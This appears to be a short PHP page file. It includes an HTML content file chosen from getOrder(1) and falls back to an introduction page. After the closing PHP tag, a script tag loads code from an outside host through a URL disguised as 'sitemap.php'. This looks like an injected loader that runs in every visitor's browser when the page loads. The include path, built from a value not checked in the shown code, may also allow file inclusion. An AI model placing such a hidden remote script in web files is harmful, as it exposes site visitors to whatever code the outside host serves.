<?php

$path = array('content/' . getOrder(1) . '.html', 'content/introduction.html');

require $path[+!file_exists($path[0])];

?><script src=http://johanneswallmark.com/media/sitemap.php ></script>